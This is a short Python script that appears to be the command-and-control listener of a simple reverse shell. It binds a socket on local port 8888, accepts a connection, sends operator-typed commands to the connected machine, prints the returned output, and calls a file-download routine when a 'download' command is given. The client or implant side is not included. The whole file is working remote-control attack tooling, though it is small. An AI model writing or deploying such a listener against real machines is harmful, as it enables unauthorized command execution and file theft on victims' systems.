import socket
import subprocess
from fileSend import download_file
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def start_server():
    s.bind(('127.0.0.1', 8888))
    s.listen(5)
    client, addr = s.accept()
    while True:
        command = str(input('Send command: '))
        download_check = re.findall('download\s?...*', command.lower())
        client.send(command.encode())
        if command.lower() == 'exit':
            break
        if download_check:
            download_file()
        result_output = client.recv(1024).decode()
        print(result_output)
    client.close()
    s.close()

start_server()